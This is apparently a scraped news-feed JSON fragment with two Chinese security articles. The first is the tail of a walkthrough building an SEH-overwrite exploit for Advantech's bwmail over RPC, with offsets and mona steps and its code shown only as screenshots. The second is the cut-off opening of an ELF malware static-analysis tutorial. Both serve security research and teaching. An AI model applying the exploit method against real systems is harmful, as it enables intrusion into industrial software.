center;\">图4：根本原因</p><p>如果我跳过此调用并检查堆栈，则可以看到它已被payload完全覆盖，无需担心ASLR或DEP，首先我需要确保我可以通过网络发送此攻击payload。</p><p style=\"text-align: center;\"><img src=\"https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1579191632127-6REPIAPMZMAIICFNE5UA/ke17ZwdGBToddI8pDm48kKLqMlWCPdudun8p5KLDdxFZw-zPPgdn4jUwVcJE1ZvWQUxwkmyExglNqGp0IvTJZamWLI2zvYWH8K3-s_4yszcp2ryTI0HqTOaaUohrI8PITxeqJV2V5NS-wC90vBwsn3Ahzg9nJWNA3hHAZpxiFBY/Picture5.png?format=1000w\"/></p><p style=\"text-align: center;\">图5：堆栈的其余部分</p><p>为了通过RPC进行测试，我将利用ZDI研究人员<a href=\"https://twitter.com/FritzSands\">Fritz Sands</a>和他的<a href=\"https://www.zerodayinitiative.com/blog/2018/6/7/down-the-rabbit-hole-a-deep-dive-into-an-attack-on-an-rpc-interface\">博客</a>文章Advantech和RPC <a href=\"https://github.com/thezdi/PoC/tree/master/CVE-2016-0856\">发布</a>的一些代码。为此，我将使用两台计算机：右侧的Windows 7计算机是攻击者，左侧的Windows 10计算机是受害者。</p><p>我附加到该过程，启用子调试，然后启动，进入调试器验证是否已成功加载。</p><p style=\"text-align: center;\"><img src=\"https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1579191747302-86WGHIMRQS5T8QEUW1BC/ke17ZwdGBToddI8pDm48kOW1m2A9RgiL1evLOUo_KzxZw-zPPgdn4jUwVcJE1ZvWQUxwkmyExglNqGp0IvTJZamWLI2zvYWH8K3-s_4yszcp2ryTI0HqTOaaUohrI8PIDTbr3xenHqqmZrzUqAWbUPp-iDaXpiN483MZT2XB6Ng/Picture6.png?format=1000w\"/></p><p style=\"text-align: center;\">图6：检查paylaod是否可以远程传送</p><p><span style=\"font-size: 20px;\"><strong>0x03 &#160;漏洞利用</strong></span></p><p>为了帮助加快利用开发速度，我将使用<a href=\"https://twitter.com/corelanc0d3r\">Peter Van Eeckhoutte</a>编写windbg的<a href=\"https://github.com/corelan/windbglib\">mona</a>。Mona具有一些很好的功能，它将简化利用过程。首先，我需要查看缓冲区实际上在什么时候被覆盖，为此，我可以使用mona生成非重复的字符串，我可以在调试中搜索该字符串。</p><p style=\"text-align: center;\"><img src=\"https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1579192091182-HMM8O7OWLTT0EJ0AJ9HW/ke17ZwdGBToddI8pDm48kD_UfJqkm-W-y3ys5mOSRWBZw-zPPgdn4jUwVcJE1ZvWQUxwkmyExglNqGp0IvTJZamWLI2zvYWH8K3-s_4yszcp2ryTI0HqTOaaUohrI8PI6To6GQ7AoUn5hIP3N-jP5NwIjMB3Z-UmCNu49Cw3jsg/Picture7.png?format=1000w\"/></p><p style=\"text-align: center;\">图7：使用mona创建字符串</p><p>接下来，我将该模式作为命令行参数发送回bwmail应用程序，并且按预期，该应用程序将crash。</p><p style=\"text-align: center;\"><img src=\"https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1579192143842-BTMDMH1PG9X5VCRK1IOL/ke17ZwdGBToddI8pDm48kLe6LWMlKBq-Vv2EhBmmYxhZw-zPPgdn4jUwVcJE1ZvWQUxwkmyExglNqGp0IvTJZamWLI2zvYWH8K3-s_4yszcp2ryTI0HqTOaaUohrI8PITMwTbLtPUWqyaMkXQiLbKmDmKrh8WlGXRIFtElLe2T8/Picture8.png?format=1000w\"/></p><p style=\"text-align: center;\">图8：基于循环模式的crash</p><p>一旦调试器在crash时中断，我将使用mona的findmsp功能在应用程序进程内存中搜索循环模式的所有引用。在查看这样的输出时，我首先检查寄存器部分，以查找以下三种情况之一：覆盖保存的返回指针（EIP），直接寄存器控制或覆盖结构化异常处理程序（SEH）。</p><p>在此特定示例中，我将使用后者：</p><p style=\"text-align: center;\"><img src=\"https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1579192189163-9JWSASQ0QQQDYM119GYJ/ke17ZwdGBToddI8pDm48kAFsUSSKKlmnQ5Qxr8CgXjpZw-zPPgdn4jUwVcJE1ZvWQUxwkmyExglNqGp0IvTJZamWLI2zvYWH8K3-s_4yszcp2ryTI0HqTOaaUohrI8PIyE_WFN3XtFiXRVyJEd069uiFIUaIhYvCZrFPgsB2GVU/Picture9.png?format=1000w\"/></p><p style=\"text-align: center;\">图9：使用mona的findmsp函数查找循环模式</p><p>Mona告诉我，发送1,192字节的数据后，下一个异常注册记录（nSEH）被覆盖。</p><p>使用mona的sehchain功能，mona将打印一个漏洞利用模板供我使用。</p><p style=\"text-align: center;\"><img src=\"https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1579192477279-A287HJKNYHFG5GBO8K8K/ke17ZwdGBToddI8pDm48kMYS97YDZ964kPC-PsrdCZNZw-zPPgdn4jUwVcJE1ZvWQUxwkmyExglNqGp0IvTJZamWLI2zvYWH8K3-s_4yszcp2ryTI0HqTOaaUohrI8PIWCjOwOEgHJeyy_Ns8_U9jS-2IugWvb4TGJWH1DYbj1E/Picture10.png?format=1000w\"/></p><p style=\"text-align: center;\">图10：由mona提供的payload格式，</p><p>为了实现这一点，我将需要1,192字节的数据，一个短跳转，一个pop / pop / ret指令以及一些shellcode。</p><p>接下来，我需要一个pop / pop / ret指令集的位置，Mona seh -n将在进程存储器中搜索这些指令，并忽略任何包含空字节的结果。</p><p style=\"text-align: center;\"><img src=\"https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1579194512253-5XJ6L16JDIGYQ39594VM/ke17ZwdGBToddI8pDm48kAs_J0lBf1JvVIafT9CqwFdZw-zPPgdn4jUwVcJE1ZvWQUxwkmyExglNqGp0IvTJZamWLI2zvYWH8K3-s_4yszcp2ryTI0HqTOaaUohrI8PIol2DSb4AzQb3sP3fXrGVtYOwyVAhpc7_no7sX2z9fu8/Picture11.png?format=1000w\"/></p><p style=\"text-align: center;\">图11：使用mona查找pop / pop / ret指令</p><p>如果利用了DEP或ASLR等现代漏洞利用缓解措施，则Mona还会返回找到的有效pop / pop / ret指令。</p><p style=\"text-align: center;\"><img src=\"https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1579194723160-YYKRSY33QB7MHL9FIXZC/ke17ZwdGBToddI8pDm48kJgRbFuPhVm4f5DQi9afq9FZw-zPPgdn4jUwVcJE1ZvWQUxwkmyExglNqGp0IvTJZamWLI2zvYWH8K3-s_4yszcp2ryTI0HqTOaaUohrI8PILhzv7z9gPCLegz8VfcZ7eZpubCFfMdM-WuaxGXmrTY0/Picture12.png?format=1000w\"/></p><p style=\"text-align: center;\">图12：结果</p><p>添加Windows Shellcode后：</p><p style=\"text-align: center;\"><img src=\"https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1579194760503-PJVAWQ05AO65EFFFOZ47/ke17ZwdGBToddI8pDm48kO2g8sTfwRddiZVzRE0p1T9Zw-zPPgdn4jUwVcJE1ZvWQUxwkmyExglNqGp0IvTJZamWLI2zvYWH8K3-s_4yszcp2ryTI0HqTOaaUohrI8PI9572HEdwD0dlgJgxrcUSea6r5hN_zLRJzWo_-ZQDNLo/Picture13.png?format=1000w\"/></p><p style=\"text-align: center;\">图13：Shellcode</p>","descriptionType":"text/html","publishedDate":"Thu, 03 Sep 2020 02:16:39 +0000","feedId":6942,"bgimg":"https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1579190851916-0NGWMH6LPLVZYHPAAV50/ke17ZwdGBToddI8pDm48kGquRXuSNM8VNiRz-JE3cjFZw-zPPgdn4jUwVcJE1ZvWQUxwkmyExglNqGp0IvTJZamWLI2zvYWH8K3-s_4yszcp2ryTI0HqTOaaUohrI8PIiuQFkNGSHnwfzV1gwJ8nndsfNWuEXxXBQeWWtn1_abk/Fig1.png?format=1000w","linkMd5":"072eb2032d7770811393baa5bd62da28","bgimgJsdelivr":"https://cdn.jsdelivr.net/gh/myreaderx12/cdn47@2020_2/2020/09/05/07-30-56-464_76475fd303526faa.webp","destWidth":818,"destHeight":784,"sourceBytes":31244,"destBytes":22210,"author":"h1apwn","articleImgCdnMap":{"https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1579190851916-0NGWMH6LPLVZYHPAAV50/ke17ZwdGBToddI8pDm48kGquRXuSNM8VNiRz-JE3cjFZw-zPPgdn4jUwVcJE1ZvWQUxwkmyExglNqGp0IvTJZamWLI2zvYWH8K3-s_4yszcp2ryTI0HqTOaaUohrI8PIiuQFkNGSHnwfzV1gwJ8nndsfNWuEXxXBQeWWtn1_abk/Fig1.png?format=1000w":"https://cdn.jsdelivr.net/gh/myreaderx12/cdn47@2020_2/2020/09/05/07-30-56-464_76475fd303526faa.webp","https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1579191013284-XF6EEC322W9E5TPUGS6E/ke17ZwdGBToddI8pDm48kOuKQhATqZFNN3vX4_aPbztZw-zPPgdn4jUwVcJE1ZvWQUxwkmyExglNqGp0IvTJZamWLI2zvYWH8K3-s_4yszcp2ryTI0HqTOaaUohrI8PI1S574DVO7IFsPUeqc-YKuBpb1LF01TSQHKWZqGa7C-8/Picture2.png?format=1000w":"https://cdn.jsdelivr.net/gh/myreaderx5oss/cdn91@2020_6/2020/09/05/07-31-16-830_63989643fcae901a.webp","https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1579191075147-WYIB5NUVO6YHAOW6YA86/ke17ZwdGBToddI8pDm48kBZ7TSA-OIHIMgNUW3PhN0UUqsxRUqqbr1mOJYKfIPR7LoDQ9mXPOjoJoqy81S2I8N_N4V1vUb5AoIIIbLZhVYxCRW4BPu10St3TBAUQYVKc__cYxNkZ9ENOO4OE3kD_Y7ZnqXUYsnMuOC9JBBnWpP9VlWo1ts9fs6mkZXFLIxF6/Picture3.png?format=1000w":"https://cdn.jsdelivr.net/gh/myreaderx29/cdn14@2020_4/2020/09/05/07-31-15-154_0516796452a557c3.webp","https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1579191576348-7XLM4TIQX5XW2NFS3EBX/ke17ZwdGBToddI8pDm48kBchc7xnrS7Gdo12TWJ-8n5Zw-zPPgdn4jUwVcJE1ZvWQUxwkmyExglNqGp0IvTJZamWLI2zvYWH8K3-s_4yszcp2ryTI0HqTOaaUohrI8PIW2WQp2P3Lck4hhr40BERrd2UNrVWY2NhjRIcV6fFPyk/Picture4.png?format=1000w":"https://cdn.jsdelivr.net/gh/myreaderx18/cdn95@2020_2/2020/09/05/07-31-21-107_64d446828dd981e3.webp","https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1579191632127-6REPIAPMZMAIICFNE5UA/ke17ZwdGBToddI8pDm48kKLqMlWCPdudun8p5KLDdxFZw-zPPgdn4jUwVcJE1ZvWQUxwkmyExglNqGp0IvTJZamWLI2zvYWH8K3-s_4yszcp2ryTI0HqTOaaUohrI8PITxeqJV2V5NS-wC90vBwsn3Ahzg9nJWNA3hHAZpxiFBY/Picture5.png?format=1000w":"https://cdn.jsdelivr.net/gh/myreaderx30/cdn22@2020_6/2020/09/05/07-31-23-765_34eeb26cc2716dfc.webp","https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1579191747302-86WGHIMRQS5T8QEUW1BC/ke17ZwdGBToddI8pDm48kOW1m2A9RgiL1evLOUo_KzxZw-zPPgdn4jUwVcJE1ZvWQUxwkmyExglNqGp0IvTJZamWLI2zvYWH8K3-s_4yszcp2ryTI0HqTOaaUohrI8PIDTbr3xenHqqmZrzUqAWbUPp-iDaXpiN483MZT2XB6Ng/Picture6.png?format=1000w":"https://cdn.jsdelivr.net/gh/myreaderx22/cdn72@2020_2/2020/09/05/07-31-19-663_b90d759f20fb6594.webp","https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1579192091182-HMM8O7OWLTT0EJ0AJ9HW/ke17ZwdGBToddI8pDm48kD_UfJqkm-W-y3ys5mOSRWBZw-zPPgdn4jUwVcJE1ZvWQUxwkmyExglNqGp0IvTJZamWLI2zvYWH8K3-s_4yszcp2ryTI0HqTOaaUohrI8PI6To6GQ7AoUn5hIP3N-jP5NwIjMB3Z-UmCNu49Cw3jsg/Picture7.png?format=1000w":"https://cdn.jsdelivr.net/gh/myreaderx19/cdn88@2020_4/2020/09/05/07-31-20-783_f5446210fc9c5e4c.webp","https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1579192143842-BTMDMH1PG9X5VCRK1IOL/ke17ZwdGBToddI8pDm48kLe6LWMlKBq-Vv2EhBmmYxhZw-zPPgdn4jUwVcJE1ZvWQUxwkmyExglNqGp0IvTJZamWLI2zvYWH8K3-s_4yszcp2ryTI0HqTOaaUohrI8PITMwTbLtPUWqyaMkXQiLbKmDmKrh8WlGXRIFtElLe2T8/Picture8.png?format=1000w":"https://cdn.jsdelivr.net/gh/myreaderx18/cdn23@2020_5/2020/09/05/07-31-17-029_74a5365155f3739c.webp","https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1579192189163-9JWSASQ0QQQDYM119GYJ/ke17ZwdGBToddI8pDm48kAFsUSSKKlmnQ5Qxr8CgXjpZw-zPPgdn4jUwVcJE1ZvWQUxwkmyExglNqGp0IvTJZamWLI2zvYWH8K3-s_4yszcp2ryTI0HqTOaaUohrI8PIyE_WFN3XtFiXRVyJEd069uiFIUaIhYvCZrFPgsB2GVU/Picture9.png?format=1000w":"https://cdn.jsdelivr.net/gh/myreaderx7/cdn27@2020_3/2020/09/05/07-31-22-070_e24b527d502104d3.webp","https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1579192477279-A287HJKNYHFG5GBO8K8K/ke17ZwdGBToddI8pDm48kMYS97YDZ964kPC-PsrdCZNZw-zPPgdn4jUwVcJE1ZvWQUxwkmyExglNqGp0IvTJZamWLI2zvYWH8K3-s_4yszcp2ryTI0HqTOaaUohrI8PIWCjOwOEgHJeyy_Ns8_U9jS-2IugWvb4TGJWH1DYbj1E/Picture10.png?format=1000w":"https://cdn.jsdelivr.net/gh/myreaderx24/cdn59@2020_3/2020/09/05/07-31-22-717_d45d71e70a2b9fcf.webp","https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1579194512253-5XJ6L16JDIGYQ39594VM/ke17ZwdGBToddI8pDm48kAs_J0lBf1JvVIafT9CqwFdZw-zPPgdn4jUwVcJE1ZvWQUxwkmyExglNqGp0IvTJZamWLI2zvYWH8K3-s_4yszcp2ryTI0HqTOaaUohrI8PIol2DSb4AzQb3sP3fXrGVtYOwyVAhpc7_no7sX2z9fu8/Picture11.png?format=1000w":"https://cdn.jsdelivr.net/gh/myreaderx16/cdn82@2020_4/2020/09/05/07-31-23-277_5cd80cba3cf67f92.webp","https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1579194723160-YYKRSY33QB7MHL9FIXZC/ke17ZwdGBToddI8pDm48kJgRbFuPhVm4f5DQi9afq9FZw-zPPgdn4jUwVcJE1ZvWQUxwkmyExglNqGp0IvTJZamWLI2zvYWH8K3-s_4yszcp2ryTI0HqTOaaUohrI8PILhzv7z9gPCLegz8VfcZ7eZpubCFfMdM-WuaxGXmrTY0/Picture12.png?format=1000w":"https://cdn.jsdelivr.net/gh/myreaderx30/cdn4@2020_1/2020/09/05/07-31-21-079_d3ca0bd53f5eae3c.webp","https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1579194760503-PJVAWQ05AO65EFFFOZ47/ke17ZwdGBToddI8pDm48kO2g8sTfwRddiZVzRE0p1T9Zw-zPPgdn4jUwVcJE1ZvWQUxwkmyExglNqGp0IvTJZamWLI2zvYWH8K3-s_4yszcp2ryTI0HqTOaaUohrI8PI9572HEdwD0dlgJgxrcUSea6r5hN_zLRJzWo_-ZQDNLo/Picture13.png?format=1000w":"https://cdn.jsdelivr.net/gh/myreaderx10/cdn61@2020_2/2020/09/05/07-31-25-120_0b0449f05049c040.webp"},"publishedOrCreatedDate":1599291056255},{"createdTime":"2020-09-05 15:30:56","updatedTime":"2020-09-05 15:30:56","title":"ELF恶意软件的静态分析原理和方法（上）","link":"https://www.4hou.com/posts/o7gK","description":"<p style=\"text-align: center;\"><img src=\"https://img.4hou.com/uploads/ueditor/php/upload/image/20200824/1598239246200041.jpeg\" title=\"1598190615298835.jpeg\" alt=\"shutterstock_282380951-1-1024x475.jpg\"/></p><p style=\"text-align: left;\">ELF(Executable and Linkable Format)是Linux下的一种格式标准，Linux中的ELF格式文件一共有四种：</p><p style=\"text-align: left;\">1.可重定位文件(Relocatable File)：这类文件包含了代码和数据，可被用来链接成可执行文件或者共享目录文件，扩展名为.o</p><p style=\"text-align: left;\">2.可执行文件(Executable File)：这类文件包含了可以直接执行的程序，一般没有扩展名</p><p style=\"text-align: left;\">3.共享目录文件(Shared Object File)：这类文件包含了代码和数据，扩展名为.so。</p><p style=\"text-align: left;\">共享目录文件一般可以在以下两种情况下使用：</p><p style=\"text-align: left;\">4.核心转储文件(Core Dump File)：当进程意外终止时，系统可以将该进程的地址空间的内容以及终止时的一些其他信息转储在核心转储文件中。</p><p style=\"text-align: left;\">目前，Linux在操作系统市场上占有很大份额，因为它是开源的，免费的且面向软件开发的，这意味着它丰富的生态系统使开发人员可以轻松访问许多不同的工件。 Linux是Web服务器，物联网，超级计算机和公共云工作载荷的主要操作系统。尽管Linux仅占台式机市场份额的2％，而Windows却占有88％的份额，但我们不应忽视Linux桌面安全性，这一点在2019年7月发现EvilGnome时得到了证明。</p><p style=\"text-align: left;\">Linux几乎无处不在，但在整个杀毒行业中普遍存在低Linux威胁检测的趋势，这促使攻击者近年来积极地将其定位为该操作系统。研究人员已经披露了高度复杂的ELF恶意软件，事实证明，攻击者正越来越多地将Linux恶意软件添加到其武器库中。目前，没有足够的公司搜寻和发布有关最新Linux威胁的IOC和其他信息。此操作系统上有许多未发现的威胁，随着Linux继续流行，我们预计随着时间的推移会暴露出更多的威胁，安全研究人员必须具备分析和理解Linux恶意软件的能力。</p><p style=\"text-align: left;\">本文，我们将为你提供实用的知识和工具，以进行有效的ELF恶意软件分析。这样你将更好地理解ELF格式，并学习如何使用静态和动态方法分析ELF文件。此外，我们还将介绍有用的分析工具并动手实践恶意软件分析。</p><p style=\"text-align: left;\">在深入探讨ELF技术分析之前，先介绍一下ELF恶意软件，回顾ELF威胁状况，解析Linux设备最初是如何攻击恶意软件的，并详细说明为什么它对于安全研究人员或恶意软件分析师来说很重要，以获得ELF分析技能。</p><p><span style=\"font-size: 20px;\"><strong>Linux的威胁情况</strong></span></p><p style=\"text-align: left;\">Linux攻击主要集中在DDoS僵尸网络和挖矿中。然而，实际比这复杂得多，而这是APT和其他网络犯罪组织开发的更为复杂的威胁的根源。在2019年，研究人员记录了20多个以前未发现的Linux威胁实例。这些威胁包括大规模的挖矿活动、僵尸网络、勒索软件和国家赞助的攻击。</p><p style=\"text-align: left;\">以下Linux威胁只是研究社区已记录的一些示例：</p><p style=\"text-align: left;\">QNAPCrypt：针对Linux文件存储服务器的勒索软件活动，此活动是俄罗斯网络犯罪组织FullofDeep实施的。</p><p style=\"text-align: left;\">Cloud Snooper：Sophos的研究人员在Linux服务器上发现了RAT。该威胁已在Amazon Web Services EC2实例上被识别了，并通过使用不同的工具绕过安全措施加以应用。研究人员认为，由于其工具集和复杂性，攻击是由APT进行的。</p><p style=\"text-align: left;\">Winnti：Winnti：在一家名为拜耳的德国制药公司的系统上发现了与WinntiUmbrella集团有关的后门，这是在野外公开的第一个Winnti Linux变体。</p><p style=\"text-align: left;\">HiddenWasp：针对Linux服务器的RAT。它由一个rootkit，一个木马和一个初始部署脚本组成。在研究人员发现时，尽管使用了来自Mirai和Azazel rootkit等各种开源项目的代码，但仍未检测到该恶意软件。</p><p style=\"text-align: left;\">EvilGnome：Linux桌面后门植入物，与俄罗斯Gamaredon集团有联系。该恶意软件具有许多功能，包括文件窃取，捕获桌面屏幕截屏，录音和模块扩展的功能。</p><p style=\"text-align: left;\">Dacls：RAT与360 Netlab报告的Lazarus APT组有关，研究人员发现该恶意软件的ELF和PE版本，这是Lazarus最早公开的Linux恶意软件。</p><p style=\"text-align: left;\">ManusCrypt：与Lazarus组绑定的RAT。据报道，该恶意软件主要针对Windows。最近发现了该恶意软件的Linux版本，类似于US CERT在2020年5月报告的ManusCrypt变体F PE恶意软件。</p><p style=\"text-align: left;\">MESSAGETAP：由FireEye在电信公司的Linux服务器上发现的Infostealer。这些服务器充当短消息服务中心（SMSC），将SMS消息路由到收件人。该恶意软件旨在窃取SMS流量，并且还与Winnti集团有关。</p><p style=\"text-align: left;\">Linux威胁不仅基于恶意软件利用受害者计算资源的风险来确定。它们还包含有害和侵入性恶意软件，这些恶意软件可能会攻击受害者的私有域。</p><p><span style=\"font-size: 20px;\"><strong>ELF恶意软件如何攻击系统？</strong></span></p><p style=\"text-align: left;\">与台式机钓鱼不同，台式机是网络钓鱼的常见攻击方法，而希望渗透到服务器和物联网平台的攻击者则不能依靠最终用户代其安装恶意软件。用户无需与浏览器和电子邮件帐户进行交互，这使得网络钓鱼攻击在这些环境中几乎无关紧要。这意味着恶意软件进入系统的入口点必须更具针对性。以下是用于攻击非桌面Linux设备的主要攻击媒介：</p><p style=\"text-align: left;\">1.漏洞利用：攻击者将搜索可利用且未修补的面向公众的组件，以访问系统。例如，NOTROBIN后门背后的攻击者利用Citrix NetScaler中的漏洞CVE-2019-1978传播了恶意软件。攻击者在Sophos XG防火墙中发现并利用了零日攻击（SQL注入远程代码执行）后，就开始了Asnarok木马攻击。错误配置的服务还可以充当攻击者的切入点，攻击者利用配置错误的开放式Docker Daemon API端口后，恶意软件便开始传播。</p><p style=\"text-align: left;\">2.使用有效凭证：默认软件凭证或攻击的凭证。攻击者可以通过多种方法来窃取密码，包括密码喷雾，凭据填充和本地发现。研究人员认为，Cloud Snooper攻击是由攻击者通过SSH访问服务器发起的，而SSH受密码身份验证保护。</p><p style=\"text-align: left;\">3.滥用信任关系：攻击者可以利用进入可以直接访问受害者系统的第三方组织的入口，这些组织对受害人维护的基础结构的访问权限可能有限，但可以存在于同一网络中。例如，攻击者可以在获得这些组织的有效凭据后，违反IT服务承包商的要求，然后将其客户作为目标。</p><p><span style=\"font-size: 20px;\"><strong>Linux恶意软件</strong></span></p><p style=\"text-align: left;\">不仅是安全厂商完全无法发现的新型复杂Linux恶意软件，而且是常见的恶意软件。 Mirai是一个很好的例子，Mirai是一个DDoS僵尸网络，其源代码被广泛发布，现在许多僵尸网络变体都基于此代码。攻击者使用此特定Mirai样本绕过检测时所需要的就是通过混淆文件的字符串来进行一些签名更改。</p><p style=\"text-align: center;\"><img src=\"https://img.4hou.com/uploads/ueditor/php/upload/image/20200824/1598239246658866.png\" title=\"1598190633133381.png\" alt=\"sample.png\"/></p><p style=\"text-align: left;\">该样本于3月份上传到VirusTotal，检测为零。当时研究人员发表<a href=\"https://www.intezer.com/blog/linux/evasion-techniques-dissected-mirai-case-study/\" target=\"_self\">一篇文章</a>，讨论了在检测这种恶意软件和其他Linux威胁时，代码重用分析和基于签名的检测的有效性。到目前为止，该文件的病毒报告只列出了<a href=\"https://www.virustotal.com/gui/file/1fc49503c92bce012cc9210a0490fb3657ff9177d342ce61a86dbabd530b7a15/detection\" target=\"_self\">一个检测</a>。</p><p style=\"text-align: left;\">在调查ELF恶意软件时，当前的杀毒解决方案并不可靠。这就是将分析ELF文件添加到技能组中很重要的原因之一。</p><p style=\"text-align: left;\">如果你想了解更多有关为何传统解决方案无法正确检测到ELF的信息，请查看<a href=\"https://www.youtube.com/watch?v=c2IChPlYgHE\" target=\"_self\">此文</a>。</p><p><span style=\"font-size: 20px;\"><strong>ELF文件分析的挑战</strong></span></p><p style=\"text-align: left;\">因此，如果你有一个要分析的可疑ELF文件，应该怎么开始？</p><p style=\"text-align: left;\">互联网上充斥着有关PE文件分析的信息，并且还有各种易于使用的工具和教程。但是，在搜索有关ELF分析的信息时，很容易迷路。缺少有关分析方法论，判决确定和恶意软件规避技术的相关统一信息，以及缺乏最新的开源工具，这可能会让分析变得更困难。</p><p style=\"text-align: left;\">当前没有可用于执行ELF的在线沙箱解决方案，有少数几个Linux沙箱（Limon，Detux和LiSa）需要创建沙箱实例，并且没有得到积极维护。接下里，我们将为你提供相关的ELF分析工具，以执行静态和动态分析。</p><p><span style=\"font-size: 20px;\"><strong>初始分析</strong></span></p><p style=\"text-align: left;\">我们已经介绍了ELF恶意软件的概况，并说明了恶意软件如何攻击系统。我们讨论了当前缺乏ELF恶意软件可见性的情况，这反映在主要引擎的检测率低于标准以及记录Linux威胁的公共资源不足方面。在本文中，我们将着重于ELF文件分析，重点是静态分析。</p><p style=\"text-align: left;\">初始分析的目的是在不花太多时间在行为分析等高级分析技术上的情况下，尽可能多地收集有关文件的见解。</p><p style=\"text-align: left;\">初始分析过程需要查看文件的不同工件，虽然人工分析本身可能不足以做出决定，但是人工分析的收集可以帮助我们确定分析实际结果。最终结果可能是我们知道文件是什么，或者我们必须进行更深入的分析。</p><p style=\"text-align: left;\">ELF文件中缺少有价值的元数据（例如证书和资源），提供的起点比PE文件弱，尤其是在区分受信任文件和恶意文件时。这就是为什么重要的一点是要考虑分析文件的上下文以及分析所需的结果。无论你是要验证文件是受信任的还是恶意的，还是已经知道文件是恶意的但要对威胁进行分类以确定适当的响应，本文中提供的信息和工具都将帮助你进一步支持初始分析结论。</p><p style=\"text-align: left;\">现在我们将介绍以下工件，并强调它们如何帮助我们收集有关文件的详细信息：</p><p style=\"text-align: left;\"><strong>·&#160;</strong>ELF格式静态组件；</p><p style=\"text-align: left;\"><strong style=\"white-space: normal;\">·&#160;</strong>符号；</p><p style=\"text-align: left;\"><strong style=\"white-space: normal;\">·</strong>&#160;段和节；</p><p style=\"text-align: left;\"><strong style=\"white-space: normal;\">·&#160;</strong>ELF标头；</p><p style=\"text-align: left;\"><strong style=\"white-space: normal;\">·</strong>&#160;文件输出；</p><p style=\"text-align: left;\"><strong style=\"white-space: normal;\">·&#160;</strong>字符串；</p><p style=\"text-align: left;\"><strong style=\"white-space: normal;\">·&#160;</strong>代码重用；</p><p style=\"text-align: left;\"><strong style=\"white-space: normal;\">·&#160;</strong>Packer（一个开源工具,用于从单一配置来源为多平台创建相同的机器映像）；</p><p style=\"text-align: left;\"><strong style=\"white-space: normal;\">·&#160;</strong>Interpreter(解析器)；</p><p style=\"text-align: left;\">介绍了分析工具集之后，我们将通过分析野外发现的真实样本来使用它们。</p><p><span style=\"font-size: 20px;\"><strong>工具集</strong></span></p><p style=\"text-align: left;\">以下是我们将要使用的工具和命令（按字母顺序）：</p><p style=\"text-align: left;\"><strong>·&#160;</strong>Detect It Easy</p><p style=\"text-align: left;\"><strong style=\"white-space: normal;\">·&#160;</strong>ElfParser</p><p style=\"text-align: left;\"><strong style=\"white-space: normal;\">·&#160;</strong>Intezer Analyze</p><p style=\"text-align: left;\"><strong style=\"white-space: normal;\">·&#160;</strong>Linux VM</p><p style=\"text-align: left;\"><strong style=\"white-space: normal;\">·&#160;</strong>objcopy</p><p style=\"text-align: left;\"><strong style=\"white-space: normal;\">·&#160;</strong>Pyinstaller</p><p style=\"text-align: left;\"><strong style=\"white-space: normal;\">·&#160;</strong>readelf</p><p style=\"text-align: left;\"><strong style=\"white-space: normal;\">·&#160;</strong>shc</p><p style=\"text-align: left;\"><strong style=\"white-space: normal;\">·&#160;</strong>strings</p><p style=\"text-align: left;\"><strong style=\"white-space: normal;\">·&#160;</strong>UnSHc</p><p style=\"text-align: left;\"><strong style=\"white-space: normal;\">·&#160;</strong>UPX</p><p style=\"text-align: left;\"><strong style=\"white-space: normal;\">·&#160;</strong>VMprotect</p><p><span style=\"font-size: 20px;\"><strong>配置运行环境</strong></span></p><p style=\"text-align: left;\">我们将使用Linux虚拟机（VM）作为演示环境。如果你没有Linux VM，请按照此<a href=\"https://itsfoss.com/install-linux-in-virtualbox/\" target=\"_self\">指南</a>进行安装。</p><p style=\"text-align: left;\">我们还将编译不同的示例，如果你对此步骤不感兴趣，为方便起见，我们已将编译后的示例存储在专用存储库中，我们将在全文中引用这些示例。</p><p style=\"text-align: left;\">让我们准备我们的环境：</p><p style=\"text-align: left;\">1.运行你的VM；</p><p style=\"text-align: left;\">2.如果你刚刚安装了VM，请确保为计算机截屏；</p><p style=\"text-align: left;\">3.允许共享剪贴板从主机转移到访客：</p><p style=\"text-align: center;\"><img src=\"https://img.4hou.com/uploads/ueditor/php/upload/image/20200824/1598239247575040.jpeg\" title=\"1598190848205443.jpeg\" alt=\"1.webp.jpg\"/></p><p style=\"text-align: left;\">4.编译以下代码（你可以从<a href=\"https://raw.githubusercontent.com/intezer/ELF-Malware-Analysis-101/master/Part-2-Initial-Analysis/Article-samples/training-sample\" target=\"_self\">此处</a>下载编译的文件）：</p><p style=\"text-align: center;\"><img src=\"https://img.4hou.com/uploads/ueditor/php/upload/image/20200824/1598239247166089.png\" title=\"1598190856136296.png\" alt=\"2.png\"/></p><p style=\"text-align: left;\">4.1运行nano training_sample.c，复制代码，然后保存（ctrl + x）</p><p style=\"text-align: left;\">4.2运行gcc training_sample.c -o training-sample</p><p><span style=\"font-size: 20px;\"><strong>ELF格式静态组件</strong></span></p><p style=\"text-align: left;\">在本节中，我们将使用编译后的文件来审查与初始分析相关的ELF格式的组件。</p><p style=\"text-align: left;\">在分析ELF文件的静态功能时，readelf命令是最有用的工具。 readelf应该已经安装在Linux VM上。运行readelf 